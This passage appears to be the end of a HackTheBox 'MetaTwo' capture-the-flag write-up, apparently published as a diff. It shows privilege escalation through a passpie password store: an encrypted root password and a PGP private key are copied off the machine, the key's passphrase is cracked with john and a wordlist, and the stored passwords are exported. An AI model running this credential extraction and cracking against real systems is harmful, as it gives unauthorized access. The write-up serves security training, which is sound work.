+/home/jnelson/.passpie
+jnelson@meta2:~/.passpie$ ls -al
+total 24
+dr-xr-x--- 3 jnelson jnelson 4096 Oct 25 12:52 .
+drwxr-xr-x 4 jnelson jnelson 4096 Oct 30 05:06 ..
+-r-xr-x--- 1 jnelson jnelson    3 Jun 26 13:57 .config
+-r-xr-x--- 1 jnelson jnelson 5243 Jun 26 13:58 .keys
+dr-xr-x--- 2 jnelson jnelson 4096 Oct 25 12:52 ssh
+jnelson@meta2:~/.passpie$ find .
+.
+./.keys
+./ssh
+./ssh/root.pass
+./ssh/jnelson.pass
+./.config
+jnelson@meta2:~/.passpie$ cat ssh/root.pass
+comment: ''
+fullname: root@ssh
+login: root
+modified: 2022-06-26 08:58:15.621572
+name: ssh
+password: '-----BEGIN PGP MESSAGE-----
+
+
+  hQEOA6I+wl+LXYMaEAP/T8AlYP9z05SEST+Wjz7+IB92uDPM1RktAsVoBtd3jhr2
+
+  nAfK00HJ/hMzSrm4hDd8JyoLZsEGYphvuKBfLUFSxFY2rjW0R3ggZoaI1lwiy/Km
+
+  yG2DF3W+jy8qdzqhIK/15zX5RUOA5MGmRjuxdco/0xWvmfzwRq9HgDxOJ7q1J2ED
+
+  /2GI+i+Gl+Hp4LKHLv5mMmH5TZyKbgbOL6TtKfwyxRcZk8K2xl96c3ZGknZ4a0Gf
+
+  iMuXooTuFeyHd9aRnNHRV9AQB2Vlg8agp3tbUV+8y7szGHkEqFghOU18TeEDfdRg
+
+  krndoGVhaMNm1OFek5i1bSsET/L4p4yqIwNODldTh7iB0ksB/8PHPURMNuGqmeKw
+
+  mboS7xLImNIVyRLwV80T0HQ+LegRXn1jNnx6XIjOZRo08kiqzV2NaGGlpOlNr3Sr
+
+  lpF0RatbxQGWBks5F3o=
+
+  =uh1B
+
+  -----END PGP MESSAGE-----
+
+  '
+```
+
+Let's try to crack that PGP `key` file, but first let's transfer that into our machine
+
+```js
+❯ scp jnelson@10.10.11.186:.passpie/.keys .keys
+```
+
+The `.keys` file contain two `PGP KEY BLOCK`, I remove the public ones
+
+```js
+> cat key
+-----BEGIN PGP PRIVATE KEY BLOCK-----
+
+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
+=7Uo6
+-----END PGP PRIVATE KEY BLOCK-----
+```
+
+Convert that into `john` format
+
+```js
+❯ gpg2john key > gpg.john
+```
+
+And it's `cracked`
+
+-   Key: blink182
+
+```js
+❯ john -w=/usr/share/wordlists/rockyou.txt gpg.john
+Using default input encoding: UTF-8
+Loaded 1 password hash (gpg, OpenPGP / GnuPG Secret Key [32/64])
+Cost 1 (s2k-count) is 65011712 for all loaded hashes
+Cost 2 (hash algorithm [1:MD5 2:SHA1 3:RIPEMD160 8:SHA256 9:SHA384 10:SHA512 11:SHA224]) is 2 for all loaded hashes
+Cost 3 (cipher algorithm [1:IDEA 2:3DES 3:CAST5 4:Blowfish 7:AES128 8:AES192 9:AES256 10:Twofish 11:Camellia128 12:Camellia192 13:Camellia256]) is 7 for all loaded hashes
+Will run 2 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+blink182         (Passpie)
+1g 0:00:00:02 DONE (2022-10-30 02:23) 0.3663g/s 70.32p/s 70.32c/s 70.32C/s ginger..november
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed.
+```
+
+Checking the list of `passpie` if they have any, another user
+
+```js
+jnelson@meta2:~/.passpie$ passpie list
+╒════════╤═════════╤════════════╤═══════════╕
+│ Name   │ Login   │ Password   │ Comment   │
+╞════════╪═════════╪════════════╪═══════════╡
+│ ssh    │ jnelson │ ********   │           │
+├────────┼─────────┼────────────┼───────────┤
+│ ssh    │ root    │ ********   │           │
+╘════════╧═════════╧════════════╧═══════════╛
+```
+
+Export the passwords in `pass` file
+
+```js
+jnelson@meta2:~$ touch pass
+jnelson@meta2:~$ passpie export pass
+```
+
+And we got `root.txt`
+
+<FixTheImageURL src='cmd4.png' slug='hackthebox-metatwo-writeup' />
